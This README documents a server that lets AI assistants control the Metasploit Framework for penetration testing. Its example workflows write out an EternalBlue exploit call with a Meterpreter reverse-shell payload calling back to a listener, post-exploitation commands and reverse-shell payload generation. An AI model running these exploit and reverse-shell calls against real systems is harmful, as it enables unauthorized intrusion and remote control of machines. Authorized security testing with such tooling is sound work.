[![MseeP.ai Security Assessment Badge](https://mseep.net/pr/gh05tcrew-metasploitmcp-badge.png)](https://mseep.ai/app/gh05tcrew-metasploitmcp)

# Metasploit MCP Server

A Model Context Protocol (MCP) server for Metasploit Framework integration.


https://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1


## Description

This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.

## Features

### Module Information

- **list_exploits**: Search and list available Metasploit exploit modules
- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering

### Exploitation Workflow

- **run_exploit**: Configure and execute an exploit against a target with options to run checks first
- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options
- **run_post_module**: Execute post-exploitation modules against existing sessions

### Payload Generation

- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)

### Session Management

- **list_active_sessions**: Show current Metasploit sessions with detailed information
- **send_session_command**: Run a command in an active shell or Meterpreter session
- **terminate_session**: Forcefully end an active session

### Handler Management

- **list_listeners**: Show all active handlers and background jobs
- **start_listener**: Create a new multi/handler to receive connections
- **stop_job**: Terminate any running job or handler

## Prerequisites

- Metasploit Framework installed and msfrpcd running
- Python 3.10 or higher
- Required Python packages (see requirements.txt)

## Installation

1. Clone this repository
2. Install dependencies:
   ```
   pip install -r requirements.txt
   ```
3. Configure environment variables (optional):
   ```
   MSF_PASSWORD=yourpassword
   MSF_SERVER=127.0.0.1
   MSF_PORT=55553
   MSF_SSL=false
   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
   ```

## Usage

Start the Metasploit RPC service:

```bash
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
```

### Transport Options

The server supports two transport methods:

- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients
- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections

You can explicitly select the transport mode using the `--transport` flag:

```bash
# Run with HTTP/SSE transport (default)
python MetasploitMCP.py --transport http

# Run with STDIO transport
python MetasploitMCP.py --transport stdio
```

Additional options for HTTP mode:
```bash
python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
```

### Claude Desktop Integration

For Claude Desktop integration, configure `claude_desktop_config.json`:

```json
{
    "mcpServers": {
        "metasploit": {
            "command": "uv",
            "args": [
                "--directory",
                "C:\\path\\to\\MetasploitMCP",
                "run",
                "MetasploitMCP.py",
                "--transport",
                "stdio"
            ],
            "env": {
                "MSF_PASSWORD": "yourpassword"
            }
        }
    }
}
```

### Other MCP Clients

For other MCP clients that use HTTP/SSE:

1. Start the server in HTTP mode:
   ```bash
   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085
   ```

2. Configure your MCP client to connect to:
   - SSE endpoint: `http://your-server-ip:8085/sse`

## Security Considerations

⚠️ **IMPORTANT SECURITY WARNING**:

This tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.

- Always validate and review all commands before execution
- Only run in segregated test environments or with proper authorization
- Be aware that post-exploitation commands can result in significant system modifications

## Example Workflows

### Basic Exploitation

1. List available exploits: `list_exploits("ms17_010")`
2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", {"RHOSTS": "192.168.1.100"}, "windows/x64/meterpreter/reverse_tcp", {"LHOST": "192.168.1.10", "LPORT": 4444})`
3. List sessions: `list_active_sessions()`
4. Run commands: `send_session_command(1, "whoami")`

### Post-Exploitation

1. Run a post module: `run_post_module("windows/gather/enum_logged_on_users", 1)`
2. Send custom commands: `send_session_command(1, "sysinfo")`
3. Terminate when done: `terminate_session(1)`

### Handler Management

1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
2. List active handlers: `list_listeners()`
3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
4. Stop a handler: `stop_job(1)`

## Testing

This project includes comprehensive unit and integration tests to ensure reliability and maintainability.

### Prerequisites for Testing

Install test dependencies:

```bash
pip install -r requirements-test.txt
```

Or use the convenient installer:

```bash
python run_tests.py --install-deps
# OR
make install-deps
```

### Running Tests

#### Quick Commands

```bash
# Run all tests
python run_tests.py --all
# OR
make test

# Run with coverage report
python run_tests.py --all --coverage
# OR
make coverage

# Run with HTML coverage report
python run_tests.py --all --coverage --html
# OR
make coverage-html
```

#### Specific Test Suites

```bash
# Unit tests only
python run_tests.py --unit
# OR
make test-unit

# Integration tests only  
python run_tests.py --integration
# OR
make test-integration

# Options parsing tests
python run_tests.py --options
# OR
make test-options

# Helper function tests
python run_tests.py --helpers
# OR
make test-helpers

# MCP tools tests
python run_tests.py --tools
# OR
make test-tools
```

#### Test Options

```bash
# Include slow tests
python run_tests.py --all --slow

# Include network tests (requires actual network)
python run_tests.py --all --network

# Verbose output
python run_tests.py --all --verbose

# Quick test (no coverage, fail fast)
make quick-test

# Debug mode (detailed failure info)
make test-debug
```

### Test Structure

- **`tests/test_options_parsing.py`**: Unit tests for the graceful options parsing functionality
- **`tests/test_helpers.py`**: Unit tests for internal helper functions and MSF client management
- **`tests/test_tools_integration.py`**: Integration tests for all MCP tools with mocked Metasploit backend
- **`conftest.py`**: Shared test fixtures and configuration
- **`pytest.ini`**: Pytest configuration with coverage settings

### Test Features

- **Comprehensive Mocking**: All Metasploit dependencies are mocked, so tests run without requiring an actual MSF installation
- **Async Support**: Full async/await testing support using pytest-asyncio
- **Coverage Reporting**: Detailed coverage analysis with HTML reports
- **Parametrized Tests**: Efficient testing of multiple input scenarios
- **Fixture Management**: Reusable test fixtures for common setup scenarios

### Coverage Reports

After running tests with coverage, reports are available in:

- **Terminal**: Coverage summary displayed after test run
- **HTML**: `htmlcov/index.html` (when using `--html` option)

### CI/CD Integration

For continuous integration:

```bash
# CI-friendly test command
make ci-test
# OR
python run_tests.py --all --coverage --verbose
```

## Configuration Options

### Payload Save Directory

By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.

**Setting the environment variable:**

- **Windows (PowerShell)**:
  ```powershell
  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
  ```

- **Windows (Command Prompt)**:
  ```cmd
  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
  ```

- **Linux/macOS**:
  ```bash
  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
  ```

- **In Claude Desktop config**:
  ```json
  "env": {
      "MSF_PASSWORD": "yourpassword",
      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
  }
  ```

**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.

## License

Apache 2.0
